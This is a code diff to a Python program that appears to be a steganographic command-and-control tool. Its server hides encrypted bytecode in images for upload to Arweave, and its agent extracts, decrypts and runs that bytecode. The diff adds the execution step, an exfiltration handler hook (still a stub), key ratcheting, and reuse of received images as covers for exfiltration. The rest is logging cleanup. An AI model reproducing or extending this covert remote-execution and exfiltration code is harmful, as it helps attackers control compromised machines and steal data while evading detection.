@@ -92,10 +92,10 @@ def run_server(args):
     payload, new_ratchet = encrypt_task(bytecode, K_ratchet)
     payload_length = len(payload)
     logger.info(f"Step A, Payload length is {payload_length}")
-    logger.info(f"Step A, Payload assembly finished")
+    logger.info("Step A, Payload assembly finished")
 
     #Embeds the payload
-    logger.info(f"Step B, Payload embedding start")
+    logger.info("Step B, Payload embedding start")
     stego_image = embed(args.cover, payload, K_extract)
 
     stego_dir = "src/temp"
@@ -104,15 +104,15 @@ def run_server(args):
     stego_image.save(stego_path)
 
     logger.info(f"Step B, Embedded image saved to {stego_path}")
-    logger.info(f"Step B, Payload embedding finished")
+    logger.info("Step B, Payload embedding finished")
 
     #Uploads the stego image
-    logger.info(f"Step C, Image upload start")
+    logger.info("Step C, Image upload start")
     if args.mock:
         mock = MockArweave()
         txid = mock.upload_image("server_wallet", stego_path)
         logger.info(f"Step C, Image uploaded in transaction_id {txid}")
-        logger.info(f"Step C, Image upload finished")
+        logger.info("Step C, Image upload finished")
     else:
         raise NotImplementedError("Real Arweave upload not configured")
 
@@ -123,13 +123,24 @@ def run_server(args):
     shared_state["K_extract"] = K_extract
     shared_state["K_ratchet"] = K_ratchet
 
+    return 1
+
 def run_agent(args):
     #Load agent keys from keyfile
     agent_keys = agent_load_agent_keys(args.keyfile)
 
     K_ratchet = agent_keys["K_ratchet"]
     K_exfil_ratchet = agent_keys["K_exfil_ratchet"]
-    K_Extract = agent_keys["K_extract"]
+    K_extract = agent_keys["K_extract"]
+
+    #Guard against unsupported watch mode
+    if args.bootstrap_url is None:
+        logger.info("Watch mode not yet implemented")
+        return -1
+
+    #Exfiltration handler closure with access to agent keys and state
+    def exfil_handler(vm, data):
+        return -1
 
     #Download the bootstrap image
     logger.info("Step A, Bootstrap image download start")
@@ -155,8 +166,8 @@ def run_agent(args):
     logger.info(f"Step B, Bootstap image saved to {stego_path}")
 
     #Extract the payload from the bootstrap image
-    payload = extract(stego_path, K_Extract)
-    logger.info(f"Step B, Bootstap image payload extracted")
+    payload = extract(stego_path, K_extract)
+    logger.info("Step B, Bootstap image payload extracted")
     logger.info(f"Step B, Payload length {len(payload)}")
     logger.info("Step B, Bootstrap image stego extraction finished")
 
@@ -173,25 +184,24 @@ def run_agent(args):
     logger.info("Step C, Payload decryption succesful")
     logger.info("Step C, Payload decryption finished")
 
-    
+    #Execute the bytecode 
+    logger.info("Step D, Bytecode execution start")
+    vm_result = execute_bytecode(bytecode, exfil_handler=exfil_handler)
+    logger.info(f"Step D, Bytecode execution vm result is {vm_result}")
+    logger.info("Step D, Bytecode execution finished")
 
+    #Advance and persist ratchet
+    logger.info("Step E, Advance and persist ratchet start")
+    agent_save_agent_keys(args.keyfile, agent_new_ratchet, K_exfil_ratchet, K_extract)
+    logger.info("Step E, Advance and persist ratchet Finished")
 
+    #Save received image for reuse as next exfil cover
+    logger.info("Save received image for reuse as next exfil cover start")
+    shared_state["cover_path"] = stego_path
+    logger.info("Save received image for reuse as next exfil cover finished")
 
-
-
-
-    
-
-    
-
-    
-
-
-
-
-
-
-
+    return 1
+ 
 #Parses args and dispatches
 if __name__ == "__main__":
     args = parser.parse_args()
